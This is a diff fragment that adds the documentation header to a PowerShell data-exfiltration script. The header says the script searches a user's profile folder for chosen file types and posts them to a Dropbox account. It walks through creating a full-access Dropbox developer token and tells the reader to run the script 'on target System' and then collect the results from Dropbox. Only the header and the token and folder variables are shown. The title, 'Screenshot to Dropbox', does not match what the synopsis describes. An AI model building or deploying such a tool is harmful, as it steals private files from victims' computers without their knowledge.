@@ -1,3 +1,22 @@
+<#
+============================================= Screenshot to Dropbox ========================================================
+
+SYNOPSIS
+This script searches for specific filetypes in the users folder and posts to a Dropbox account (developer app and token required).
+
+SETTING UP DROPBOX
+goto https://www.dropbox.com/developers/apps
+click 'create app'
+name it and select 'full dropbox' permission
+open your newly created app and click 'Generate Token' in the 0auth section.
+copy that token into your script.
+
+USAGE
+1. Input your credentials below
+2. Run Script on target System
+3. Check Dropbox for results
+
+#> 
 #=========================================================================================
 $accessToken = "DROPBOX_ACCESS_TOKEN_HERE"
 $localFolderPath = "$env:USERPROFILE\"
